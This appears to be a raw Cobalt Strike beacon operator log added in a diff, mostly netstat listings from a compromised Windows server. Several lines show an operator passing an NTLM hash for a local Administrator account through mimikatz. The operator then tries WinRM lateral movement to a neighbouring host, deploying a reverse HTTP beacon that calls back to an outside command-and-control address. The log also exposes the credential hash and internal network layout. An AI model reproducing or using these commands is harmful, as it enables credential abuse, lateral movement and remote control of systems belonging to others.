+  TCP    100.100.1.199:53076    116.181.3.49:80        CLOSE_WAIT      6760
+  TCP    100.100.1.199:53111    116.181.3.49:80        CLOSE_WAIT      6760
+  TCP    100.100.1.199:55918    100.100.1.199:1433     ESTABLISHED     2092
+  TCP    100.100.1.199:57805    100.100.1.199:1433     ESTABLISHED     2360
+  TCP    100.100.1.199:59274    120.52.183.190:80      CLOSE_WAIT      6012
+  TCP    100.100.1.199:59959    100.100.1.199:1433     TIME_WAIT       0
+  TCP    100.100.1.199:59968    100.100.1.199:1433     TIME_WAIT       0
+  TCP    100.100.1.199:60443    100.100.1.199:1433     TIME_WAIT       0
+  TCP    100.100.1.199:60598    100.100.1.15:135       TIME_WAIT       0
+  TCP    100.100.1.199:60744    100.100.1.199:1433     TIME_WAIT       0
+  TCP    100.100.1.199:60829    100.100.1.199:1433     ESTABLISHED     2092
+  TCP    100.100.1.199:60832    100.100.1.199:1433     TIME_WAIT       0
+  TCP    100.100.1.199:60841    100.100.1.199:1433     TIME_WAIT       0
+  TCP    100.100.1.199:61955    100.100.1.199:1433     ESTABLISHED     10344
+  TCP    100.100.1.199:61956    100.100.1.199:1433     ESTABLISHED     10344
+  TCP    100.100.1.199:61957    100.100.1.199:1433     ESTABLISHED     10344
+  TCP    100.100.1.199:61958    100.100.1.199:1433     ESTABLISHED     10344
+  TCP    100.100.1.199:61961    100.100.1.199:1433     ESTABLISHED     10344
+  TCP    100.100.1.199:61962    100.100.1.199:1433     ESTABLISHED     10344
+  TCP    100.100.1.199:61963    100.100.1.199:1433     ESTABLISHED     10344
+  TCP    100.100.1.199:61964    100.100.1.199:1433     ESTABLISHED     10344
+  TCP    100.100.1.199:61965    100.100.1.199:1433     ESTABLISHED     10344
+  TCP    100.100.1.199:62350    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:62351    110.242.68.3:443       TIME_WAIT       0
+  TCP    100.100.1.199:62368    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:62376    81.68.74.87:9900       TIME_WAIT       0
+  TCP    100.100.1.199:62384    100.100.1.199:1433     TIME_WAIT       0
+  TCP    100.100.1.199:62386    100.100.1.199:1433     TIME_WAIT       0
+  TCP    100.100.1.199:62389    100.100.1.199:1433     TIME_WAIT       0
+  TCP    100.100.1.199:62444    81.68.74.87:9900       TIME_WAIT       0
+  TCP    100.100.1.199:62461    81.68.74.87:9900       TIME_WAIT       0
+  TCP    100.100.1.199:62463    110.242.68.3:443       TIME_WAIT       0
+  TCP    100.100.1.199:62495    81.68.74.87:9900       TIME_WAIT       0
+  TCP    100.100.1.199:62617    110.242.68.3:443       TIME_WAIT       0
+  TCP    100.100.1.199:62747    100.100.1.199:1433     TIME_WAIT       0
+  TCP    100.100.1.199:62757    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:62775    110.242.68.3:443       TIME_WAIT       0
+  TCP    100.100.1.199:62790    100.100.1.199:1433     TIME_WAIT       0
+  TCP    100.100.1.199:62810    81.68.74.87:9900       TIME_WAIT       0
+  TCP    100.100.1.199:62820    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:62868    81.68.74.87:9900       TIME_WAIT       0
+  TCP    100.100.1.199:62917    81.68.74.87:9900       TIME_WAIT       0
+  TCP    100.100.1.199:62931    110.242.68.3:443       TIME_WAIT       0
+  TCP    100.100.1.199:62944    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:62992    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:63009    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:63021    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:63037    100.100.1.199:1433     TIME_WAIT       0
+  TCP    100.100.1.199:63049    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:63061    110.242.68.3:443       TIME_WAIT       0
+  TCP    100.100.1.199:63142    81.68.74.87:9900       TIME_WAIT       0
+  TCP    100.100.1.199:63165    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:63169    81.68.74.87:9900       TIME_WAIT       0
+  TCP    100.100.1.199:63172    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:63208    110.242.68.3:443       TIME_WAIT       0
+  TCP    100.100.1.199:63333    81.68.74.87:9900       TIME_WAIT       0
+  TCP    100.100.1.199:63361    81.68.74.87:9900       TIME_WAIT       0
+  TCP    100.100.1.199:63362    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:63377    110.242.68.3:443       TIME_WAIT       0
+  TCP    100.100.1.199:63414    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:63419    81.68.74.87:9900       TIME_WAIT       0
+  TCP    100.100.1.199:63453    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:63472    81.68.74.87:9900       TIME_WAIT       0
+  TCP    100.100.1.199:63524    81.68.74.87:9900       TIME_WAIT       0
+  TCP    100.100.1.199:63526    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:63531    110.242.68.3:443       TIME_WAIT       0
+  TCP    100.100.1.199:63536    81.68.74.87:9900       TIME_WAIT       0
+  TCP    100.100.1.199:63542    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:63556    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:63591    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:63594    81.68.74.87:9900       TIME_WAIT       0
+  TCP    100.100.1.199:63595    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:63599    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:63605    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:63607    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:63612    81.68.74.87:9900       TIME_WAIT       0
+  TCP    100.100.1.199:63627    81.68.74.87:9900       TIME_WAIT       0
+  TCP    100.100.1.199:63638    110.242.68.3:443       TIME_WAIT       0
+  TCP    100.100.1.199:63670    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:63693    81.68.74.87:9900       TIME_WAIT       0
+  TCP    100.100.1.199:63708    81.68.74.87:9900       TIME_WAIT       0
+  TCP    100.100.1.199:63753    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:63821    110.242.68.3:443       TIME_WAIT       0
+  TCP    100.100.1.199:63840    81.68.74.87:9900       TIME_WAIT       0
+  TCP    100.100.1.199:63952    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:64003    110.242.68.3:443       TIME_WAIT       0
+  TCP    100.100.1.199:64041    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:64051    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:64056    81.68.74.87:9900       TIME_WAIT       0
+  TCP    100.100.1.199:64106    81.68.74.87:9900       TIME_WAIT       0
+  TCP    100.100.1.199:64127    81.68.74.87:20087      TIME_WAIT       0
+  TCP    100.100.1.199:64138    81.68.74.87:9900       TIME_WAIT       0
+  TCP    100.100.1.199:64153    81.68.74.87:9900       LAST_ACK        5824
+  TCP    100.100.1.199:65023    123.6.65.100:80        CLOSE_WAIT      6760
+  TCP    100.100.1.199:65074    111.6.225.214:80       CLOSE_WAIT      10748
+  TCP    127.0.0.1:1434         0.0.0.0:0              LISTENING       7144
+  TCP    127.0.0.1:3306         127.0.0.1:65248        ESTABLISHED     3704
+  TCP    127.0.0.1:49157        127.0.0.1:49158        ESTABLISHED     2600
+  TCP    127.0.0.1:49158        127.0.0.1:49157        ESTABLISHED     2600
+  TCP    127.0.0.1:49213        127.0.0.1:49214        ESTABLISHED     6012
+  TCP    127.0.0.1:49214        127.0.0.1:49213        ESTABLISHED     6012
+  TCP    127.0.0.1:49718        127.0.0.1:49719        ESTABLISHED     2092
+  TCP    127.0.0.1:49719        127.0.0.1:49718        ESTABLISHED     2092
+  TCP    127.0.0.1:65248        127.0.0.1:3306         ESTABLISHED     5272
+  TCP    [::]:21                [::]:0                 LISTENING       2536
+  TCP    [::]:80                [::]:0                 LISTENING       4
+  TCP    [::]:135               [::]:0                 LISTENING       964
+  TCP    [::]:445               [::]:0                 LISTENING       4
+  TCP    [::]:800               [::]:0                 LISTENING       1472
+  TCP    [::]:1433              [::]:0                 LISTENING       7144
+  TCP    [::]:1801              [::]:0                 LISTENING       2988
+  TCP    [::]:2103              [::]:0                 LISTENING       2988
+  TCP    [::]:2105              [::]:0                 LISTENING       2988
+  TCP    [::]:2107              [::]:0                 LISTENING       2988
+  TCP    [::]:3196              [::]:0                 LISTENING       5668
+  TCP    [::]:5985              [::]:0                 LISTENING       4
+  TCP    [::]:7776              [::]:0                 LISTENING       4
+  TCP    [::]:8010              [::]:0                 LISTENING       4
+  TCP    [::]:8020              [::]:0                 LISTENING       4
+  TCP    [::]:20200             [::]:0                 LISTENING       6388
+  TCP    [::]:47001             [::]:0                 LISTENING       4
+  TCP    [::]:49152             [::]:0                 LISTENING       776
+  TCP    [::]:49153             [::]:0                 LISTENING       552
+  TCP    [::]:49154             [::]:0                 LISTENING       652
+  TCP    [::]:49155             [::]:0                 LISTENING       1364
+  TCP    [::]:49156             [::]:0                 LISTENING       868
+  TCP    [::]:49160             [::]:0                 LISTENING       2988
+  TCP    [::]:49348             [::]:0                 LISTENING       840
+  TCP    [::]:49349             [::]:0                 LISTENING       6536
+  TCP    [::1]:1434             [::]:0                 LISTENING       7144
+  UDP    0.0.0.0:500            *:*                                    652
+  UDP    0.0.0.0:3196           *:*                                    5668
+  UDP    0.0.0.0:4500           *:*                                    652
+  UDP    0.0.0.0:5355           *:*                                    224
+  UDP    0.0.0.0:6001           *:*                                    2600
+  UDP    100.100.1.199:137      *:*                                    4
+  UDP    100.100.1.199:138      *:*                                    4
+  UDP    [::]:500               *:*                                    652
+  UDP    [::]:3196              *:*                                    5668
+  UDP    [::]:4500              *:*                                    652
+  UDP    [::]:5355              *:*                                    224
+
+
+03/09 02:19:54 UTC [input] <user1> rev2self
+03/09 02:19:54 UTC [task] <T1134> Tasked beacon to revert token
+03/09 02:19:54 UTC [input] <user1> pth WMSDTSERVER\Administrator 2d9268cfbd6ba57d5a2c34a58341872d
+03/09 02:19:54 UTC [task] <T1075, T1093> Tasked beacon to run mimikatz's sekurlsa::pth /user:Administrator /domain:WMSDTSERVER /ntlm:2d9268cfbd6ba57d5a2c34a58341872d /run:"%COMSPEC% /c echo 4fe68f53a2c > \\.\pipe\ca78a6" command
+03/09 02:19:54 UTC [input] <user1> jump winrm64 100.100.1.200 test
+03/09 02:19:54 UTC [checkin] host called home, sent: 296086 bytes
+03/09 02:19:55 UTC [task] <T1028, T1086> Tasked beacon to run windows/beacon_http/reverse_http (81.68.74.87:9900) on 100.100.1.200 via WinRM
+03/09 02:19:55 UTC [output]
+Impersonated NT AUTHORITY\SYSTEM
+
+03/09 02:19:56 UTC [output]
+received output:
+user	: Administrator
+domain	: WMSDTSERVER
+program	: C:\Windows\system32\cmd.exe /c echo 4fe68f53a2c > \\.\pipe\ca78a6
+impers.	: no
+NTLM	: 2d9268cfbd6ba57d5a2c34a58341872d
+  |  PID  6768
+  |  TID  1104
+  |  LSA Process is now R/W
+  |  LUID 0 ; 329646721 (00000000:13a60281)
+  \_ msv1_0   - data copy @ 0000004BA1641500 : OK !
+  \_ kerberos - 
+
+
+03/09 02:19:56 UTC [checkin] host called home, sent: 226441 bytes
+03/09 02:20:04 UTC [output]
+received output:
+#< CLIXML
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>正在准备首次使用模块。</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S="progress" RefId="1"><TNRef RefId="0" /><MS><I64 N="SourceId">2</I64><PR N="Record"><AV>正在准备首次使用模块。</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S="progress" RefId="2"><TNRef RefId="0" /><MS><I64 N="SourceId">3</I64><PR N="Record"><AV>正在准备首次使用模块。</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><S S="Error">[100.100.1.200] 连接到远程服务器 100.100.1.200 失败，并显示以下错误消息: WinRM _x000D__x000A_</S><S S="Error">客户端无法处理该请求。如果身份验证方案与 Kerberos 不同，或者客户端计算机未加入_x000D__x000A_</S><S S="Error">到域中， 则必须使用 HTTPS 传输或者必须将目标计算机添加到 TrustedHosts 配置设置_x000D__x000A_</S><S S="Error">。 使用 winrm.cmd 配置 TrustedHosts。请注意，TrustedHosts 列表中的计算机可能未_x000D__x000A_</S><S S="Error">经过身份验证。 通过运行以下命令可获得有关此内容的更多信息: winrm help config。 _x000D__x000A_</S><S S="Error">有关详细信息，请参阅 about_Remote_Troubleshooting 帮助主题。_x000D__x000A_</S><S S="Error">    + CategoryInfo          : OpenError: (100.100.1.200:String) [], PSRemoting _x000D__x000A_</S><S S="Error">   TransportException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : ServerNotTrusted,PSSessionStateBroken_x000D__x000A_</S></Objs>
+
+03/09 02:22:40 UTC [input] <user1> socks stop
+03/09 02:22:40 UTC [output]
+stopped proxy pivot on 64577
+
+03/09 02:23:54 UTC [input] <user1> shell netstat -ano
+03/09 02:23:54 UTC [task] <T1059> Tasked beacon to run: netstat -ano
+03/09 02:23:54 UTC [checkin] host called home, sent: 43 bytes
+03/09 02:24:09 UTC [output]
+received output:
+
+活动连接
+
+  协议  本地地址          外部地址        状态           PID
+  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       2536
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       964
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:800            0.0.0.0:0              LISTENING       1472
+  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       7144
+  TCP    0.0.0.0:1801           0.0.0.0:0              LISTENING       2988
+  TCP    0.0.0.0:2103           0.0.0.0:0              LISTENING       2988
+  TCP    0.0.0.0:2105           0.0.0.0:0              LISTENING       2988
+  TCP    0.0.0.0:2107           0.0.0.0:0              LISTENING       2988
+  TCP    0.0.0.0:3196           0.0.0.0:0              LISTENING       5668
+  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       3704
+  TCP    0.0.0.0:5222           0.0.0.0:0              LISTENING       2600
+  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:6001           0.0.0.0:0              LISTENING       2600
+  TCP    0.0.0.0:6002           0.0.0.0:0              LISTENING       2600
+  TCP    0.0.0.0:7776           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:7777           0.0.0.0:0              LISTENING       2092
+  TCP    0.0.0.0:7778           0.0.0.0:0              LISTENING       1532
+  TCP    0.0.0.0:7779           0.0.0.0:0              LISTENING       1532
+  TCP    0.0.0.0:8010           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:8020           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:8088           0.0.0.0:0              LISTENING       1404
+  TCP    0.0.0.0:20200          0.0.0.0:0              LISTENING       6388
+  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       776
+  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       552
+  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       652
+  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       1364
+  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       868
+  TCP    0.0.0.0:49160          0.0.0.0:0              LISTENING       2988
+  TCP    0.0.0.0:49348          0.0.0.0:0              LISTENING       840
+  TCP    0.0.0.0:49349          0.0.0.0:0              LISTENING       6536
+  TCP    0.0.0.0:53047          0.0.0.0:0              LISTENING       2128
+  TCP    100.100.1.199:139      0.0.0.0:0              LISTENING       4
+  TCP    100.100.1.199:1433     100.100.1.199:50396    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.199:51410    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.199:51664    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.199:52102    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.199:52105    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.199:52112    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.199:52162    TIME_WAIT       0
+  TCP    100.100.1.199:1433     100.100.1.199:52976    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.199:53057    TIME_WAIT       0
+  TCP    100.100.1.199:1433     100.100.1.199:53203    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.199:61955    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.199:61956    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.199:61957    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.199:61958    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.199:61961    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.199:61962    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.199:61963    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.199:61964    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.199:61965    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.199:65403    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.200:52695    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.200:52696    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.200:52697    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.200:52698    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.200:52700    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.200:52727    ESTABLISHED     7144
+  TCP    100.100.1.199:1433     100.100.1.200:53483    ESTABLISHED     7144
+  TCP    100.100.1.199:7776     117.136.107.141:30782  ESTABLISHED     4
+  TCP    100.100.1.199:7776     117.136.107.141:30783  ESTABLISHED     4
+  TCP    100.100.1.199:7776     117.136.107.141:30784  ESTABLISHED     4
+  TCP    100.100.1.199:7776     117.136.107.141:32738  ESTABLISHED     4
+  TCP    100.100.1.199:7776     117.136.107.141:32739  ESTABLISHED     4
+  TCP    100.100.1.199:7776     117.136.107.141:32740  ESTABLISHED     4
+  TCP    100.100.1.199:7776     192.168.13.44:2354     ESTABLISHED     4
+  TCP    100.100.1.199:7776     192.168.13.44:2355     ESTABLISHED     4
+  TCP    100.100.1.199:7776     192.168.13.44:2356     ESTABLISHED     4
+  TCP    100.100.1.199:7776     222.141.67.133:11432   ESTABLISHED     4
+  TCP    100.100.1.199:7776     222.141.67.133:24925   ESTABLISHED     4
+  TCP    100.100.1.199:7777     36.113.9.63:30369      ESTABLISHED     2092
+  TCP    100.100.1.199:7777     42.232.247.91:7296     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     61.158.231.176:23174   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.7.62.234:10913     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.7.62.234:10977     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.7.62.234:13153     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.7.62.234:25057     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.7.62.234:25153     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.7.62.234:25953     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.7.62.234:31137     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.7.62.234:57089     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.7.62.234:57121     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.7.62.234:57249     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.7.111.63:5337      ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.7.111.63:7813      ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.7.111.63:31291     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.13.67.192:14372    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.13.67.192:14874    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.13.67.192:14877    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.13.94.146:9783     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.15.1.108:5663      ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.15.1.108:7598      ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.15.1.108:17294     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.15.1.108:28100     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     123.15.1.108:29097     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     182.118.237.93:29485   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     182.120.152.172:65024  ESTABLISHED     2092
+  TCP    100.100.1.199:7777     182.123.145.151:29215  ESTABLISHED     2092
+  TCP    100.100.1.199:7777     182.123.146.217:8289   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     182.123.147.201:34171  ESTABLISHED     2092
+  TCP    100.100.1.199:7777     182.123.151.80:42246   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     182.123.169.201:55778  ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.55:50371     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.55:50372     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.55:50374     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.55:50476     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.55:50477     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.72:1296      ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.72:1297      ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.72:1299      ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.80:64679     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.80:64680     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.80:64683     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.86:50182     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.86:50183     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.86:50185     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.105:49170    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.105:49171    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.105:49174    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.105:49443    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.105:49444    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.161:55125    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.161:55126    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.161:55128    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.216:49430    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.216:49431    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.0.216:49433    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.11.119:3756    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.11.119:3758    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.11.119:9771    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.11.250:49926   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.11.250:49927   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.11.250:49931   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.12.163:51557   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.12.163:51558   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.12.163:63224   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.13.37:49236    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.13.37:49237    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.13.37:49246    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.13.59:51129    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.13.59:56227    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.13.59:56228    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.13.99:1199     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.13.99:1203     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.13.99:1575     ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.13.103:3879    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.13.103:3880    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.13.103:3883    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.13.109:65442   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.13.116:61861   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.13.158:50047   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.13.158:50048   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.13.158:50052   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.13.248:55853   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.13.248:60036   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.13.248:60037   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.20.100:49644   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.20.100:49645   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.20.100:49652   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.20.244:1559    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.20.244:3588    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.20.244:3592    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.20.249:54302   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.20.249:54303   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.20.249:54305   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.20.249:54475   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.20.249:54477   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.27.13:58641    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.30.15:50131    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.30.49:59027    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.30.100:52500   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.30.100:53160   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.30.100:53172   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.30.227:1033    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.30.227:1487    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.30.227:1488    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.30.228:2630    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.30.228:2631    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     192.168.30.228:2655    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     218.28.58.186:29143    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     222.141.67.133:7313    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     222.141.67.133:8401    ESTABLISHED     2092
+  TCP    100.100.1.199:7777     222.141.67.133:23435   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     222.141.67.133:28024   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     222.141.67.133:32551   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     222.141.67.133:33278   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     222.141.67.133:33909   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     222.141.67.133:50480   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     222.141.67.133:53243   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     222.141.67.133:57070   ESTABLISHED     2092
+  TCP    100.100.1.199:7777     222.141.67.133:64260   ESTABLISHED     2092
+  TCP    100.100.1.199:7778     8.142.113.226:38922    CLOSE_WAIT      1532
+  TCP    100.100.1.199:7778     8.142.113.226:51954    CLOSE_WAIT      1532
+  TCP    100.100.1.199:7778     8.142.113.226:58834    CLOSE_WAIT      1532
+  TCP    100.100.1.199:49188    120.52.183.190:80      CLOSE_WAIT      6012
+  TCP    100.100.1.199:49215    111.202.1.250:5222     ESTABLISHED     6012
+  TCP    100.100.1.199:49230    116.181.3.49:80        CLOSE_WAIT      6012
+  TCP    100.100.1.199:49280    116.181.3.49:80        CLOSE_WAIT      6012
+  TCP    100.100.1.199:49691    100.100.1.199:1433     TIME_WAIT       0
+  TCP    100.100.1.199:49870    100.100.1.199:1433     TIME_WAIT       0
